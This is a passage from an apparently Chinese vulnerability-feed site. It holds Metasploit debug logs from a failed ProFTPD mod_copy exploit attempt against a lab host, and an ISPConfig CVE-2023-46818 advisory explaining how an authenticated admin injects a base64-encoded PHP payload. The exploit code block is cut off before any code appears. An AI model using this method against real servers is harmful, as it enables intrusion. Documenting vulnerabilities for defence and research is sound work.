class="hljs-params">core:</span> rhosts walker invalid <span class="hljs-operator">-</span> NoMethodError undefined method `scan&#x27; for nil:NilClass<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">57</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out. <span class="hljs-operator">-</span> Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out.<br></code></pre></td></tr></table></figure></details><h3 id="Web-Service-Errors"><a href="#Web-Service-Errors" class="headerlink" title="Web Service Errors"></a>Web Service Errors</h3><p>The following web service errors occurred before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msf-ws.<span class="hljs-built_in">log</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> exist.<br></code></pre></td></tr></table></figure></details><h3 id="Framework-Logs"><a href="#Framework-Logs" class="headerlink" title="Framework Logs"></a>Framework Logs</h3><p>The following framework logs were recorded before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs nix">[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_ssl</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/custom</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_aws_ssm</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">57</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out. <span class="hljs-operator">-</span> Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out.<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">10</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/bind_aws_instance_connect</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_ssl</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/custom</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_aws_ssm</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">16</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">16</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">22</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">22</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">22</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure></details><h3 id="Web-Service-Logs"><a href="#Web-Service-Logs" class="headerlink" title="Web Service Logs"></a>Web Service Logs</h3><p>The following web service logs were recorded before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msf-ws.<span class="hljs-built_in">log</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> exist.<br></code></pre></td></tr></table></figure></details><h3 id="Version-Install"><a href="#Version-Install" class="headerlink" title="Version&#x2F;Install"></a>Version&#x2F;Install</h3><p>The versions and install method of your Metasploit setup:</p><details><summary>Collapse</summary><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Framework</span>: <span class="hljs-number">6</span>.<span class="hljs-number">4</span>.<span class="hljs-number">55</span>-dev-<br><span class="hljs-attribute">Ruby</span>: ruby <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">26</span> revision <span class="hljs-number">31</span>d0f1a2e7)<span class="hljs-meta"> [x86_64-linux]</span><br><span class="hljs-attribute">OpenSSL</span>: OpenSSL <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>t  <span class="hljs-number">7</span> Feb <span class="hljs-number">2023</span><br><span class="hljs-attribute">Install</span> Root: /opt/metasploit-framework/embedded/framework<br><span class="hljs-attribute">Session</span> Type: Connected to msf. Connection type: postgresql.<br><span class="hljs-attribute">Install</span> Method: Omnibus Installer<br></code></pre></td></tr></table></figure></details>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ProFTPD 1.3.5 mod_copy模块命令执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/30/github_938639146/"/>
    <id>http://example.com/2025/06/30/github_938639146/</id>
    <published>2025-06-30T15:45:21.338Z</published>
    <updated>2025-06-30T15:45:21.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig的language_edit.php文件存在PHP代码注入漏洞。当<code>admin_allow_langedit</code>设置启用时，经过身份验证的管理员可以通过语言编辑器界面注入任意PHP代码。该模块会自动检查<code>admin_allow_langedit</code>权限是否启用，并尝试启用它（需要具有系统配置访问权限的管理员凭据）。漏洞利用通过将PHP有效负载注入语言文件，然后在访问该文件时执行。有效负载使用PHP的file_put_contents函数进行base64编码并写入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/47f2ba2861e1f8d14f7e2e2378d1a55052381dc2/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/47f2ba2861e1f8d14f7e2e2378d1a55052381dc2/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 